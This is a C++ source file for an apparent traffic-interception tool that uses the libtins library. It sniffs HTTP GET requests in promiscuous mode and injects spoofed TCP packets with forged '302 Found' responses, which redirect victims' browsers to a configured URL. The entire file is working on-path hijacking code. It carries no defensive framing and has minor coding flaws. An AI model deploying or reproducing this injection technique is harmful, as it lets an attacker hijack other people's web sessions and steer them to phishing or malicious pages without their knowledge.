#include "CyberInterceptor.h"
#include "Config.h"
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <fcntl.h>  
#include <iostream>  
#include "HttpParsr.h"
#include "GPengine.h"
#include <tins/tins.h>

HttpInfoCallback gnext = nullptr;
CCyberInterceptor *gcyber_this = nullptr;

bool CCyberInterceptor::redirect_url(CHttpGetInfo *pinfo)
{

	std::cout << "im in redirect_url"<<__FUNCTION__<< std::endl;

	if (pinfo->m_handle_result & URL_HANDLE_RESULT_REDIRECT)
	{

		Tins::PacketSender sender;
		//Tins::EthernetII pkt = Tins::EthernetII() / Tins::IP() / Tins::TCP() / Tins::RawPDU("foo");
		Tins::IP ip1 = Tins::IP(pinfo->m_pdu_ip->src_addr(), pinfo->m_pdu_ip->dst_addr());
		Tins::TCP tcpdat;
		tcpdat.flags(Tins::TCP::ACK);
		tcpdat.dport(pinfo->m_pdu_tcp->sport());
		tcpdat.sport(pinfo->m_pdu_tcp->dport());
		tcpdat.seq(pinfo->m_pdu_tcp->ack_seq());

		uint32_t reqlen = pinfo->m_pdu_ip->tot_len() - pinfo->m_pdu_ip->head_len() * 4 - pinfo->m_pdu_tcp->data_offset() * 4;
		uint32_t ack = reqlen + pinfo->m_pdu_tcp->seq();
		tcpdat.ack_seq(ack);

		std::string snew_url = pinfo->m_redirect_url;

		char buff[1024];
		snprintf(buff, sizeof(buff), "HTTP/1.1 302 Found\r\n\
                Content-Type: text/html\r\n\
                Location: %s\r\n\
                Content-Length: 0\r\n\r\n", snew_url.c_str());
		std::string         httpres = buff;
		Tins::IP pkt = ip1 / tcpdat / Tins::RawPDU(httpres.c_str());
		sender.send(pkt, m_str_inject_eth.c_str()); // send it through eth0
		std::cout << "we send back" << __FUNCTION__ << std::endl;
	}
	return false;

}

bool CCyberInterceptor::handle_http(CHttpGetInfo *pinfo)
{
	
	if (m_http_parser.parse(pinfo) && m_callback)
	{
		m_callback(pinfo);
		//if (pinfo->m_handle_result == URL_HANDLE_RESULT_REDIRECT)
		{
			redirect_url(pinfo);
		}
		return true;
	}

	return false;

}

bool come_and_get_me(Tins::PDU &some_pdu) {
	// Search for it. If there is no IP PDU in the packet, 
	// the loop goes on
	const Tins::IP &ip = some_pdu.rfind_pdu<Tins::IP>(); // non-const works as well

	const Tins::TCP &tcp = some_pdu.rfind_pdu<Tins::TCP>(); // non-const works as well

	const Tins::RawPDU &RawPDU = some_pdu.rfind_pdu<Tins::RawPDU>(); // non-const works as well

	Tins::RawPDU::payload_type payload = RawPDU.payload();
	uint32_t buffer_size = RawPDU.payload_size();

	if (memcmp(payload.data(),"GET ", 4)==0)
	{
		
		std::cout << "payload.data: " << payload.data() << std::endl;

		CHttpGetInfo http_info;

		http_info.m_pdu_ip = &ip;
		http_info.m_pdu_raw = &RawPDU;
		http_info.m_pdu_tcp = &tcp;
		http_info.m_dst_ip = ip.dst_addr();
		http_info.m_dst_ip = ip.src_addr();

		gcyber_this->handle_http(&http_info);
	}

	std::cout << "Destination address: " << ip.dst_addr() << std::endl;
	std::cout << "RawPDU size: " << RawPDU.size() << std::endl;
	// Just one packet please
	return true;
}

bool CCyberInterceptor::init()
{
	readcfg();

	m_tins_config.set_promisc_mode(true);
	m_tins_config.set_immediate_mode(true);
	if (m_str_filter.length()>0)
	{
		m_tins_config.set_filter(m_str_filter);
	}
	return true;

}

bool CCyberInterceptor::readcfg()
{

	const char sniff_eth[] = "snif_eth.conf";
	const char ConfigFile[] = "config.conf";
	Config configSettings(ConfigFile);
	
	m_str_filter = configSettings.Read("pcap_filter", m_str_filter);
	std::cout << "m_str_filter: "<< m_str_filter << std::endl;


	if ((access(sniff_eth, F_OK)) == -1)
	{
		std::cout << "input sniffer eth name" << std::endl;
		std::cin >> m_str_sniffer_eth;
		std::cout << "input inject eth name" << std::endl;
		std::cin >> m_str_inject_eth;
		
		std::ofstream out(sniff_eth);
		out << m_str_sniffer_eth<<"\n";
		out << m_str_inject_eth << "\n";
		return true;
	}


	std::ifstream in(sniff_eth);

	std::getline(in, m_str_sniffer_eth);
	std::getline(in, m_str_inject_eth);

	return true;
}

bool CCyberInterceptor::start(HttpInfoCallback next)
{
	if (!init())
	{
		std::cout << "init fail " << std::endl;
		return false;
	}
	std::cout << "sniffer eth name:" << m_str_sniffer_eth << std::endl;
	std::cout << "inject eth name:" << m_str_inject_eth << std::endl;

	gcyber_this = this;
	m_callback = next;

	Tins::Sniffer sniffer(m_str_sniffer_eth, m_tins_config);
	sniffer.sniff_loop(come_and_get_me);

}

CCyberInterceptor::CCyberInterceptor()
{
}

CCyberInterceptor::~CCyberInterceptor()
{
}
